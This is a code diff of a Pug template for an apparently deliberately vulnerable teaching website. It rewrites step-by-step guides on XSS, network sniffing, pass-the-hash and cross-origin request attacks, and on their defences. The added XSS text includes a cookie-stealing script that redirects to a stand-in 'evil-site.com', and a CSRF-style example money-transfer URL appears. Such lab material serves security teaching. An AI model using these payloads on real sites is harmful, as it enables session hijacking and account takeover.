@@ -24,13 +24,13 @@ html
           .dropdown 
             .dropdown-header(onclick='toggleDropdown(this)') Attack ▼
             .dropdown-content
+              #[button(type="submit" onclick="swapGuide(4, 0);") Cross-Origin Access]
+              #[button(type="submit" onclick="swapGuide(3, 0);") Network Sniffing]
               #[button(type="submit" onclick="swapGuide(1, 0);") SQL Injection]
               #[button(type="submit" onclick="swapGuide(2, 0);") Cross-Site Scripting]
-              #[button(type="submit" onclick="swapGuide(3, 0);") Network Sniffing]
-              #[button(type="submit" onclick="swapGuide(4, 0);") Cross-Origin Request]
           section#prev-button-atk #[button(type="submit" onclick="swapGuide(-1, -1);") Prev]
           section#next-button-atk #[button(type="submit" onclick="swapGuide(-1, 1);") Next]
-        p#attack-content Choose a potential Attack to get started.
+        p#attack-content Choose a potential Attack to get started.<br><br>The following OWASP vulnerabilities are compromised with attacks as listed:<br><br>-- A01 Broken Access-Control is compromised using <u>Cross-Object Access</u> Attack that takes advantage of misconfigured CORS.<br><br>-- A02 Cryptographic Failures is compromised by <u>Network Sniffing</u> for sensitive unencrypted information.<br><br>-- A03 Injection vulnerabilities can be leveraged to do <u>SQL Injection</u> or <u>Cross-Site Scripting (XSS)</u>.
     nav#side-menu-2
       section#side-content
         .button_bar
@@ -39,10 +39,10 @@ html
             .dropdown-content
               #[button(type="submit" onclick="swapGuide(1, 0);") Encryption]
               #[button(type="submit" onclick="swapGuide(2, 0);") Input Safety]
-              #[button(type="submit" onclick="swapGuide(3, 0);") Referal Safety]
+              #[button(type="submit" onclick="swapGuide(3, 0);") Referral Safety]
           section#prev-button-def #[button(type="submit" onclick="swapGuide(-1, -1);") Prev]
           section#next-button-def #[button(type="submit" onclick="swapGuide(-1, 1);") Next]
-        p#defence-content Choose a Defensive Method to get started.
+        p#defence-content Choose a Defensive Method to get started.<br><br>The following are the possible defences:<br><br>Encryption<br>-- 1. Hashing<br>-- 2. HTTPS<br><br>Input Safety<br>-- 1. Sanitisation<br>-- 2. Encoding<br><br>Referral Safety<br>-- 1. Limited URLs<br>-- 2. Configured CORS
     <br>
     section#main-content
       div(style='display: flex; justify-content: space-between; flex-wrap: wrap;')
@@ -73,7 +73,7 @@ html
               input(type="range" min="0" max="2" step="1" value="1" class="slider" onchange="setUrlLv(this.value);")
             else 
               input(type="range" min="0" max="2" step="1" value="2" class="slider" onchange="setUrlLv(this.value);")
-            span.slider.round Referal Safety
+            span.slider.round Referral Safety
         div
       button#side-menu-toggle-2 Defense 
       p Please Log In:
@@ -255,7 +255,7 @@ html
           if (module == 0) {
             document.getElementById("prev-button-atk").style.display = 'none';
             document.getElementById("next-button-atk").style.display = 'none';
-            content.innerHTML = 'Choose a potential Attack to get started.';
+            content.innerHTML = 'Choose a potential Attack to get started.<br><br>The following OWASP vulnerabilities are compromised with attacks as listed:<br><br>-- A01 Broken Access-Control is compromised using <u>Cross-Object Access</u> Attack that takes advantage of misconfigured CORS.<br><br>-- A02 Cryptographic Failures is compromised by <u>Network Sniffing</u> for sensitive unencrypted information.<br><br>-- A03 Injection vulnerabilities can be leveraged to do <u>SQL Injection</u> or <u>Cross-Site Scripting (XSS)</u>.';
           } else if (module == 1) {
             if (page == 0) {
               document.getElementById("prev-button-atk").style.display = 'none';
@@ -298,85 +298,74 @@ html
             if (page == 0) {
               document.getElementById("prev-button-atk").style.display = 'none';
               document.getElementById("next-button-atk").style.display = 'block';
-              // mention not possible if sanitised or encoded.
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 0<br><button type="submit" onclick="window.location.href=`/CORS`">CORS Site</button><br>Website frontend pages have their data rendered using HTML. This allows formatting of text, tables and photos, however it cannot run code - instead HTML uses script tags to embed javascript to execute. For example, the /login page can use embedded code to hash the inputted password for more safe sending. <br><br>An attacker can take advantage of this isolated script environments in order to add their own code. Doing so is called Cross-Site Scripting, or XSS for short. With this, one can steal valuable data from users by injecting malicious code for them to run.<br><br>For this exercise, certain data will be changed, for which you need to relocate to /login/out to undo each step before moving on.';
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 0<br><br>Website’s have their data formatted using HTML markup, presenting raw text, pictures or tables. More advanced processing of this data, however, has to be done using explicit scripts, such as on the /login page hashing the password before sending it. This is done using &lt;script&gt; tags.<br><br>An attacker’s ability to add their <u>own</u> code that runs as such a script, is called Cross-Site Scripting or XSS. Malicious functionality can be embedded into a website with XSS to run for all users who visit. <br><br>Code will likely be inputted via text-entry, as we will see, which means safe handling of the text can mitigate this. For example, Input Sanitisation and Input Encoding could completely block this attack. Go check out their respective section in Defences: Input Safety.';
             } else if (page == 1) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
-              // post on place to be accessed by all to stay there permanently
               document.getElementById("textToCopy").value = decodeURIComponent('%3Cscript%3Ealert("helloworld")%3C/script%3E');
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 1<br><br>First we need to know if a website is XSS exploitable. This technique can only work on websites that do not employ some basic defences, such as <u>Input Encoding</u> which you can read more about in its respective Defence section. To verify this, try entering the following text to either page with Encoding on and off. <br><br> &lt;script&gt;alert("helloworld")&lt;/script&gt; <button onclick="copyElementToClipboard()">Copy text</button> <br><br>How this works is that our input is assigned to a variable as normal, which the website attempts to reprint back to us. However, as our text uses the script tags, in trying to print it instead runs the inputted code. In this case, a pop-up is shown. <br><br>Now we know, with Encoding off, we can inject code that the website is forced to run.';
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 1<br><br>Before we try adding a malicious script, let’s learn how scripts might be uploaded. As mentioned, code is run between &lt;script&gt; tags, with this in mind let’s run a very simple command. On the /data page try entering the following line as a search query. <br><br>&lt;script&gt;alert("helloworld")&lt;/script&gt; <button onclick="copyElementToClipboard()">Copy text</button><br><br>The variable “searchQuery” is set to our input, which it expects to receive simple text and therefore can show plainly back to us. However, the use of the tags forces the HTML into script-mode where code can be run.';
             } else if (page == 2) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
               document.getElementById("textToCopy").value = decodeURIComponent('%3Cscript%3Ewindow.location="https://google.com?"+document.cookie%3C/script%3E');
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 2<br><br>The alert we just ran is not damaging, but let’s see the kind of harm that an attacker could do by making the command more malicious. With Cross-Site Scripting, an attacker can steal users’ cookies.<br><br>Cookies are stored on a user-by-user basis and can indicate some very important information. One particularly important item is a user’s session-cookie, which gives them their access rights to the website. If these get stolen, the thief can access the user’s session to make changes with their privilege. <br><br>A simple way to reveal stored cookies is by linking users and sending their cookies with them, for example try the following input while noting what it says in the url:<br><br>&lt;script&gt; window.location= "https://google.com?"+document.cookie &lt;/script&gt; <button onclick="copyElementToClipboard()">Copy text</button>';
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 2<br><br>Let’s upgrade our inputted script to be more malicious, for example stealing a user’s cookies, which usually contain very important information about a user. For example, with a user’s session-cookie, an attack can acquire and use that user’s account. <br><br>We can reveal a user’s cookies by leveraging the entity “document.cookie” and sending this to our own malicious site. Similar to how the search query appears in the url, the malicious site can read the sent information, including the session-cookie. To do this we must use the script to link the user via the following<br><br>&lt;script&gt; window.location= "https://evil-site.com?"+document.cookie &lt;/script&gt; <button onclick="copyElementToClipboard()">Copy text</button>';
             }  else if (page == 3) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'none';
-              // mention not possible if sanitised or encoded again.
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 3<br><br>By setting up their own website that listens to the received cookies, an attacker will be given this data. Distribute this to all users at the same time? <br><br>This clearly has some large implications for a wide user base with just a single simple input. It is therefore of great importance that this is protected against, and can be done with ease with some basic input safety such as via sanitisation or encoding.';
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 3<br><br>Now knowing what XSS attack to do, we need to find a place to deploy it. On the /login and /data pages we can input such scripts, but in these cases they will only exist for us and will not remain on the system to affect other people. We need to upload our XSS script to a place it will persist, such as the /comments page.<br><br>If you haven’t already, try using this page to add comments - first you have to log in (try entering “u1” and “p1”) then typing some text into the comment page. Now try entering the previous input we tried to here. <br><br>If you open another tab and go to the comments page, the script should still run as the added comment stays there. If you turn on Input Encoding (Input Safety lv. 2), however, the attack ceases to work. Go to the relevant section in Defences to learn why.';
             } 
           } else if (module == 3) {
             if (page == 0) {
               document.getElementById("prev-button-atk").style.display = 'none';
               document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Network Sniffing 0<br><br>take a look at the site and what things are transmitted in the url, for example username & password organised as such';
+              content.innerHTML = '-->Network Sniffing 0<br><br>When we navigate a website, the buttons we press and choices we make are communicated back to the server. These communications can be tracked and listened to. For example, enter different queries into the /data search bar and iterate through the list - notice the queries sent through the URL.<br><br>Data sent back, if heard by potential attackers, can be used for malicious means. Information can be sent through URL queries, which is the easiest to read, but even other means like via cookies and parameters can be listened to. Only encrypting our data can stop this, which is why the site being on HTTP is required for this attack to work.';
             } else if (page == 1) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Network Sniffing 1<br><br>find a network accessing data, get on and listen to network traffic. If https off can read clearly on NetSniff page - try a few with different settings (u1/p1).';
+              content.innerHTML = '-->Network Sniffing 1<br><br>Go to the user log in page with all defences off and use “u1” and “p1” to log in. Notice, as before that both of these values appear in the URL. If we instead turn on the first level of Encryption, the password is hashed to stop it being directly read, so “p1” no longer appears in the URL. Try one more time, but this time with the first level of Referral Safety, noticing nothing appears in the URL!<br><br>If an attacker is on the same network as you, they have the opportunity to spy on your traffic, more particularly to see the data you send across the internet. This has been simulated on <a style="color: red;" href="/NetListen'+getQueries()+'">this</a> site.<br><br>Notice on this site we can see what you just did! ';
             } else if (page == 2) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Network Sniffing 2<br><br>plaintext read to enter data immediately, thats why need to hash';
+              content.innerHTML = '-->Network Sniffing 2<br><br>On the /NetListen page there is a list of urls entered to simulate what an attacker might be able to find. There exist the plaintext username and password to be entered, which an attacker could easily read and input themselves to gain access to someone else’s account.<br><br>Next see the version where a Hash is used, with u1/f6455… where the password can no longer be easily read. This does not, however, mean it is intrinsically safe from attackers. Go visit <a style="color: red;" href="https://crackstation.net/">crackstation.net</a> and enter this hash - a simple rainbow table is able to rediscover the original password from it.<br><br>Brute forcing the password from its hash can only be done by choosing a password that would never be guessed. To check this, go visit <a style="color: red;" href="https://emn178.github.io/online-tools/sha256.html">this</a> website to hash different, increasingly complex, passwords to see what can be cracked.';
             }  else if (page == 3) {
               document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Network Sniffing 3<br><br>if hashed can try cracking using https://emn178.github.io/online-tools/sha256.html to hash, crackstation.net to crack. need strong password';
-            } else if (page == 4) {
-              document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'none';
-              content.innerHTML = '-->Network Sniffing 4<br><br>even if hashed, can pass-the-hash if it is in the url and requires no else, fixed with Referal Safety';
-            } 
+              content.innerHTML = '-->Network Sniffing 3<br><br>To ensure users are safe from the aforementioned attack, a good password policy should be employed such as requiring varied symbols and at least 12 characters. There are still, however, attacks that can be done, such as pass-the-hash. <br><br>If you saw another user’s username and hashed password, despite not knowing the original password, you could simply enter this into your URL as it is, rather than trying to log in via the /login interface. Try this out again using the <a style="color: red;" href="/NetListen'+getQueries()+'">NetListen</a> page. <br><br>This attack can only be stopped by sending the sensitive data via more secure means. This includes using cookies to communicate instead of URL queries, which are less easy to see and enter, and employing HTTPS.';
+            }
           } else if (module == 4) {
             if (page == 0) {
               document.getElementById("prev-button-atk").style.display = 'none';
               document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Origin Referencing 0<br><br>try out commenting and note it only works if logged in (u1/p1). This privilege is only for users and is casted specifically to them.';
+              content.innerHTML = '-->Cross-Origin Access 0<br><br>You may have noticed how buttons and links can allow you to navigate around this website. Requests are sent from the server-backend of one page, and are responded to by another, moving you across. When you move around, your cookie data is also maintained, such as for making comments. <br><br>Try logging in (e.g. entering “u1” and “p1”), our username is stored to send along with any entered comment. If we are not logged, however, no comment can be made.<br><br>Notice how the comment is sent back to the server via the URL, meaning that typing in this URL while logged in would <u>do</u> this action. Another user could enact an attack with this in mind from a remote origin like <a style="color: red;" href="/CORS'+getQueries()+'">here</a>.';
             } else if (page == 1) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Origin Referencing 1<br><br>log in and then comment, noting the url. Repost it and it occurs again. this is because of cookie storage.';
+              content.innerHTML = '-->Cross-Origin Access 1<br><br>Open the <a style="color: red;" href="/CORS'+getQueries()+'">site</a> on a separate tab and have a look at the source code (right-click, view source), noticing the button link. We are going to see how the website reacts in different cases when this button is pressed.<br><br>On the regular website, make sure you are logged out. Now on the malicious site, click the button. It will take us to the comments page but nothing will happen. Go back to the malicious site to reset.<br><br>Now try the same while logged in (try entering “u1” and “p1”), noticing this time a comment is written! This is because the website acknowledges the user as logged in (due to stored cookies) and allows the comment to action. <br><br>This attack relies on a user clicking this button while logged in, as if they are not then their session-cookie is not active. ';
             } else if (page == 2) {
               document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Origin Referencing 2<br><br>create a website that links - look at CORS & check source code that does this link. Try clicking button when logged in or not (u1/p1) as before. ';
-            }  else if (page == 3) {
-              document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'none';
-              content.innerHTML = '-->Cross-Origin Referencing 3<br><br>configure origins such that this link can only be made from accepted pages, not externally for example. Try running with CORS configured to get error.';
-            } 
+              content.innerHTML = '-->Cross-Origin Access 2<br><br>Usually requests like this are done from within the website, but as we have seen if done from an external malicious origin can be written specifically to take advantage of a user’s access. In this case, the user is forced to write a comment under their name, which could be leveraged to also publicise sensitive data. In other cases, a link like the following could be used to send money from a logged in user’s bank account.<br><br>bank.com?receive=attacker&amount=1000<br><br>This can first be blocked by simplifying our URL to stop activity like this, but more defensive procedure is required to comprehensively stop such an attack from a remote origin.<br><br>By correctly configuring our access control, such queries like this can be comprehensively stopped. In particular we must employ a Cross-Origin policy, as seen in its respective part of Defences: Referral Safety.';
+            }
           }
         } else if (help == 2) {
           let content = document.getElementById("defence-content");
           if (module == 0) {
             document.getElementById("prev-button-def").style.display = 'none';
             document.getElementById("next-button-def").style.display = 'none';
-            content.innerHTML = 'Choose a Defensive Method to get started.<br><br>The following are the possible defences:<br><br>Encryption<br>>> 1. Hashing<br>>> 2. HTTPS<br><br>Input Safety<br>>> 1. Sanitisation<br>>> 2. Encoding<br><br>Referal Safety<br>>> 1. Limited URLs<br>>> 2. Configured CORS';
+            content.innerHTML = 'Choose a Defensive Method to get started.<br><br>The following are the possible defences:<br><br>Encryption<br>-- 1. Hashing<br>-- 2. HTTPS<br><br>Input Safety<br>-- 1. Sanitisation<br>-- 2. Encoding<br><br>Referral Safety<br>-- 1. Limited URLs<br>-- 2. Configured CORS';
           } else if (module == 1) {
             if (page == 0) {
               document.getElementById("prev-button-def").style.display = 'none';
               document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Encryption<br><br>need to encrypt to keep safe. read plaintext vs ciphertext, confidentiality. Do before sending.';
+              content.innerHTML = '-->Encryption<br><br>When accessing our accounts and data, we like to lock things behind a username and password to maintain them as personally ours - to stop others seeing our data or changing it. When this is done online, however, our login information has to be sent over the internet to the website’s server to be checked, for our personal data to be sent over the internet back to us.<br><br>To keep this data safe in this process we <u>encrypt</u> it, meaning we transform it into an alternate form not easily deciphered by anyone else.<br><br>In this guide we will discuss two specific uses, Password Hashing and HTTPS.';
             } else if (page == 1) {
               document.getElementById("prev-button-def").style.display = 'block';
               document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Encryption - Hashing 1<br><br>encryption vs hash - how to store keys? need to decrypt?';
+              content.innerHTML = '-->Encryption - Hashing 1<br><br>As you will know if you have read through the Network Sniffing attack, if our password is in plaintext it can be easily read in transit so must be made harder to read. This must be done on the frontend <u>before</u> it is sent. There are two ways to do this transformation: Encryption or Hashing.<br><br>Encryption would turn plaintext into ciphertext using a key, for it to then be able to be decrypted via a key too, while Hashing is a one way process but does not require a key. <br><br>For passwords specifically we use a Hash as the server need only compare the password’s hash-form and it means we do not need to store any keys, which is a potential vulnerability of encryption.';
             } else if (page == 2) {
               document.getElementById("prev-button-def").style.display = 'block';
               document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Encryption - Hashing 2<br><br>brute forcing and good passwords - https://emn178.github.io/online-tools/sha256.html to hash, crackstation.net to crack';
+              content.innerHTML = '-->Encryption - Hashing 2<br><br>There are many different types of Hash, but the most secure and commonly used for passwords is SHA-256. While building our own site, we must make sure to avoid weak protocols like SHA-1 which is classified as insecure due to its lack of collision resistance, meaning entering a different password has a high chance of producing the same hash. <br><br>The only way to decipher a password from the secure SHA-256 is brute force, meaning in many cases an attacker will not be able to guess a password even if they have access to its hash. However, a weak password can be brute forced in a short time and is vulnerable to such a technique. To check this, go visit <a style="color: red;" href="https://emn178.github.io/online-tools/sha256.html">this</a> website to hash different, increasingly complex, passwords to see what can be cracked when entered into the cracker <a style="color: red;" href="https://crackstation.net">here</a>.';
             } else if (page == 3) {
               document.getElementById("prev-button-def").style.display = 'block';
               document.getElementById("next-button-def").style.display = 'none';
@@ -408,19 +397,19 @@ html
             if (page == 0) {
               document.getElementById("prev-button-def").style.display = 'none';
               document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Referal Safety - Limiting URLs 1<br><br>when navigating, information about our use sent to backend. Multiple ways to do this, if in URL can be manually changed. extra way to input SQLI or XSS';
+              content.innerHTML = '-->Referral Safety - Limiting URLs 1<br><br>when navigating, information about our use sent to backend. Multiple ways to do this, if in URL can be manually changed. extra way to input SQLI or XSS';
             } else if (page == 1) {
               document.getElementById("prev-button-def").style.display = 'block';
               document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Referal Safety - Limiting URLs 2<br><br>other ways to send data instead. store and sending with cookies.';
+              content.innerHTML = '-->Referral Safety - Limiting URLs 2<br><br>other ways to send data instead. store and sending with cookies.';
             } else if (page == 2) {
               document.getElementById("prev-button-def").style.display = 'block';
               document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Referal Safety - CORS 1<br><br>cookies stored often for sessions. storage of them locally can be taken advantage for attacks like shown that reach into the used session. stop this with configured CORS';
+              content.innerHTML = '-->Referral Safety - CORS 1<br><br>cookies stored often for sessions. storage of them locally can be taken advantage for attacks like shown that reach into the used session. stop this with configured CORS';
             } else if (page == 3) {
               document.getElementById("prev-button-def").style.display = 'block';
               document.getElementById("next-button-def").style.display = 'none';
-              content.innerHTML = '-->Referal Safety - CORS 2<br><br>origin header access control allow only certain hosts to make requests. easy to set up by checking referer and having allowlist of safe hosts or blocklist of known attackers.';
+              content.innerHTML = '-->Referral Safety - CORS 2<br><br>origin header access control allow only certain hosts to make requests. easy to set up by checking referer and having allowlist of safe hosts or blocklist of known attackers.';
             }
           }
         }
